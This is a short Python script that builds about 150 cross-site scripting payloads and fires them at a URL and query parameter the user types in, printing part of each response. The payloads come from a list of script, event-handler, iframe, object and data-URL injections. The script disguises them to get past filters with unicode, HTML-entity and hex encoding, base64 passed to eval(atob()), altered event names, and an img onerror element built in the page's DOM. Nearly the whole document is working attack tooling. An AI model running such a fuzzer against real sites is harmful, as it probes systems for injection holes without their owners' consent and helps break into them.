import random as rnd
import base64 as b64
import requests as req

xss_list = [
"<script>alert(1)</script>",
"<img src=x onerror=alert(1)>",
"<svg onload=alert(1)>",
"<iframe srcdoc='<script>alert(1)</script>'>",
"<body onload=alert(1)>",
"<input onfocus=alert(1) autofocus>",
"<object data='javascript:alert(1)'>",
"<link rel=stylesheet href='javascript:alert(1)'>",
"<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>"
]

def enc_unicode(txt): return ''.join(['\\u'+format(ord(c),'04x')for c in txt])
def enc_html(txt): return ''.join(['&#'+str(ord(c))+';'for c in txt])
def enc_hex(txt): return ''.join(['\\x'+format(ord(c),'02x')for c in txt])
def enc_b64eval(txt): return f'<script>eval(atob("{b64.b64encode(txt.encode()).decode()}"))</script>'
def mess_txt(txt): return txt.replace("alert","a"+"l"+"e"+"rt").replace("1","'1'")
def evt_mod(txt): return txt.replace("onerror","onerror ").replace("onload","onload ").replace("onfocus","onf\u006fcus")

dom_payload = """<script>
var p="al"+"ert";
var d=document.createElement("img");
d.setAttribute("onerror",p+"(1)");
d.src="x";
document.body.appendChild(d);
</script>"""

all_payloads = set()
for x in xss_list:
    all_payloads.update([
        x,
        enc_unicode(x),
        enc_html(x),
        enc_hex(x),
        enc_b64eval(x),
        mess_txt(x),
        evt_mod(x)
    ])

payload_bank = list(all_payloads)
while len(payload_bank) < 149:
    payload_bank.append(rnd.choice(payload_bank))

payload_bank = rnd.sample(payload_bank, 149)
payload_bank.append(dom_payload)
rnd.shuffle(payload_bank)

with open("payloads.txt","w") as f:
    for idx, val in enumerate(payload_bank):
        f.write(val + "\n\n")

target_url = input("Url: ").strip()
param_key = input("Parameter: ").strip()

for pay in payload_bank:
    try:
        res = req.get(target_url, params={param_key: pay}, timeout=2)
        print(res.text[:80])
    except Exception as err:
        print(err)
